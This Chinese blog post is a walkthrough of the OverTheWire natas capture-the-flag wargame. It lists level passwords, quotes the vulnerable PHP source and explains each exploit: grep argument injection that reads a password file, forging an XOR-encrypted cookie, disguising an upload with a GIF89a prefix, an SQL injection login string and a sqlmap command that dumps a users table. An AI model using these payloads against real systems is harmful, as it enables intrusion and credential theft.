<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    Overthewire natas wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup,Overthewire
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 43 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 23 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1535611909000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1535611909000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>Overthewire natas wp</h1>
    <p>url : <a href="http://overthewire.org/wargames/natas/" target="_blank" rel="noopener">http://overthewire.org/wargames/natas/</a></p>
<a id="more"></a>

<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>gtVrDuiDfck831PqWsLEZy5gyDz1clto </p>
<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi </p>
<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p><a href="http://natas2.natas.labs.overthewire.org/files/users.txt" target="_blank" rel="noopener">http://natas2.natas.labs.overthewire.org/files/users.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># username:password</span><br><span class="line">alice:BYNdCesZqW</span><br><span class="line">bob:jw2ueICLvT</span><br><span class="line">charlie:G5vCxkVV3m</span><br><span class="line">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</span><br><span class="line">eve:zo4mJWyNj2</span><br><span class="line">mallory:9urtcpzBmH</span><br></pre></td></tr></table></figure>

<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p><a href="http://natas3.natas.labs.overthewire.org/robots.txt" target="_blank" rel="noopener">http://natas3.natas.labs.overthewire.org/robots.txt</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /s3cr3t/</span><br></pre></td></tr></table></figure>

<p>natas3.natas.labs.overthewire.org/s3cr3t/users.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</span><br></pre></td></tr></table></figure>

<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p><a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc" target="_blank" rel="noopener">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$secret = &quot;FOEIUWGHFEEUHOFUOIU&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p>
<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</p>
<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>secret:oubWYf2kBq</p>
<p>W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</p>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</p>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>过滤了<code>|&amp;;</code> 不能截断命令了 但可以利用grep命令本身</p>
<p><code>.* /etc/natas_webpass/natas11</code></p>
<p>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</p>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>给出了源代码，发现是根据<code>$data[&quot;showpassword&quot;]</code>的值判断是否给出密码，而默认的是no</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line"></span><br><span class="line">function xor_encrypt($in) &#123;</span><br><span class="line">    $key = &apos;&lt;censored&gt;&apos;;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    // Iterate through each character</span><br><span class="line">    for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function loadData($def) &#123;</span><br><span class="line">    global $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);</span><br><span class="line">    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">        if (preg_match(&apos;/^#(?:[a-f\d]&#123;6&#125;)$/i&apos;, $tempdata[&apos;bgcolor&apos;])) &#123;</span><br><span class="line">        $mydata[&apos;showpassword&apos;] = $tempdata[&apos;showpassword&apos;];</span><br><span class="line">        $mydata[&apos;bgcolor&apos;] = $tempdata[&apos;bgcolor&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function saveData($d) &#123;</span><br><span class="line">    setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">    if (preg_match(&apos;/^#(?:[a-f\d]&#123;6&#125;)$/i&apos;, $_REQUEST[&apos;bgcolor&apos;])) &#123;</span><br><span class="line">        $data[&apos;bgcolor&apos;] = $_REQUEST[&apos;bgcolor&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过<code>loadData</code>函数变更<code>data</code>的值,如果cookie中存在格式正确的值，会把data的值替换为从cookie中取的值，所以可以通过更改cookie值来更改<code>$data[&quot;showpassword&quot;]</code>为yes</p>
<p><code>setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</code>这里base64和json都好解决，但<code>xor_encrypt</code>里的key不知道，需要先求出，异或加密只要再异或一下就能求得key了</p>
<p>然后把默认data改为yes，再生成一个cookie，修改就能拿到密码了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">$data = $defaultdata;</span><br><span class="line"></span><br><span class="line">$text = json_encode($data);</span><br><span class="line">$outText=base64_decode(&apos;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D&apos;);</span><br><span class="line">$key=&apos;&apos;;</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($text);$i++) </span><br><span class="line">&#123;</span><br><span class="line"> $key.=$text[$i]^$outText[$i];</span><br><span class="line">&#125;</span><br><span class="line">echo $key.&quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">function xor_encrypt($in) &#123;</span><br><span class="line">    $key = &apos;qw8J&apos;;</span><br><span class="line">    $text = $in;</span><br><span class="line">    $outText = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">    // Iterate through each character</span><br><span class="line">    for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">    $outText .= $text[$i] ^ $key[$i % strlen($key)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $outText;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function loadData($def) &#123;</span><br><span class="line">    global $_COOKIE;</span><br><span class="line">    $mydata = $def;</span><br><span class="line">    if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);</span><br><span class="line">    if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">        if (preg_match(&apos;/^#(?:[a-f\d]&#123;6&#125;)$/i&apos;, $tempdata[&apos;bgcolor&apos;])) &#123;</span><br><span class="line">        $mydata[&apos;showpassword&apos;] = $tempdata[&apos;showpassword&apos;];</span><br><span class="line">        $mydata[&apos;bgcolor&apos;] = $tempdata[&apos;bgcolor&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $mydata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">echo &quot;cookie:  &quot;.base64_encode(xor_encrypt(json_encode($data))).&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</p>
<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"> &lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;!-- This stuff in the header has nothing to <span class="keyword">do</span> with the level --&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/level.css"</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/jquery-ui.css"</span> /&gt;</span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://natas.labs.overthewire.org/css/wechall.css"</span> /&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://natas.labs.overthewire.org/js/jquery-1.9.1.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://natas.labs.overthewire.org/js/jquery-ui.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=http:<span class="comment">//natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src="http://natas.labs.overthewire.org/js/wechall.js"&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> wechallinfo = &#123; <span class="string">"level"</span>: <span class="string">"natas12"</span>, <span class="string">"pass"</span>: <span class="string">"&lt;censored&gt;"</span> &#125;;&lt;/script&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;natas12&lt;/h1&gt;</span><br><span class="line">&lt;div id=<span class="string">"content"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $length = <span class="number">10</span>;</span><br><span class="line">    $characters = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span>;</span><br><span class="line">    $string = <span class="string">""</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($p = <span class="number">0</span>; $p &lt; $length; $p++) &#123;</span><br><span class="line">        $string .= $characters[mt_rand(<span class="number">0</span>, strlen($characters)<span class="number">-1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span><span class="params">($dir, $ext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    $path = $dir.<span class="string">"/"</span>.genRandomString().<span class="string">"."</span>.$ext;</span><br><span class="line">    &#125; <span class="keyword">while</span>(file_exists($path));</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span><span class="params">($dir, $fn)</span> </span>&#123;</span><br><span class="line">    $ext = pathinfo($fn, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">return</span> makeRandomPath($dir, $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">"filename"</span>, $_POST)) &#123;</span><br><span class="line">    $target_path = makeRandomPathFromFilename(<span class="string">"upload"</span>, $_POST[<span class="string">"filename"</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filesize($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is too big"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'uploadedfile'</span>][<span class="string">'tmp_name'</span>], $target_path)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"The file &lt;a href=\"$target_path\"&gt;$target_path&lt;/a&gt; has been uploaded"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"There was an error uploading the file, please try again!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">"multipart/form-data"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"1000"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"filename"</span> value=<span class="string">"&lt;? print genRandomString(); ?&gt;.jpg"</span> /&gt;</span><br><span class="line">Choose a JPEG to upload (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">"uploadedfile"</span> type=<span class="string">"file"</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Upload File"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">&lt;div id=<span class="string">"viewsource"</span>&gt;&lt;a href=<span class="string">"index-source.html"</span>&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>[<img src="https://s1.ax1x.com/2018/09/13/iAOAIO.png" alt="iAOAIO.png">]</p>
<p>文件扩展名由<code>$_POST[&quot;filename&quot;]</code>决定，直接修改</p>
<p> jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</p>
<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p> 多加了一个<code>exif_imagetype()</code>函数</p>
<blockquote>
<p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
</blockquote>
<p> 在php前加<code>GIF89a</code>等图像标识可绕过</p>
<p> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 </p>
<h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?</span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&apos;localhost&apos;, &apos;natas14&apos;, &apos;&lt;censored&gt;&apos;);</span><br><span class="line">    mysql_select_db(&apos;natas14&apos;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot; and password=\&quot;&quot;.$_REQUEST[&quot;password&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) &#123;</span><br><span class="line">            echo &quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">            echo &quot;Access denied!&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>参数都没过滤，万能密码<code>&quot;or&quot;1&quot;=&quot;1</code></p>
<p>AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</p>
<h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&apos;localhost&apos;, &apos;natas15&apos;, &apos;&lt;censored&gt;&apos;);</span><br><span class="line">    mysql_select_db(&apos;natas15&apos;, $link);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        echo &quot;This user exists.&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;This user doesn&apos;t exist.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error in query.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>盲注</p>
<p>sqlmap（很快）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://natas15.natas.labs.overthewire.org/index.php --auth-type=basic --auth-cred=nata</span><br><span class="line">s15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --dbms=mysql --data username=natas16 --level=5 --risk=3 --technique=B  --string=&quot;Th</span><br><span class="line">is user exists&quot; -D natas15 -T users -C username,password --dump --threads 10</span><br></pre></td></tr></table></figure>

<p>python脚本</p>
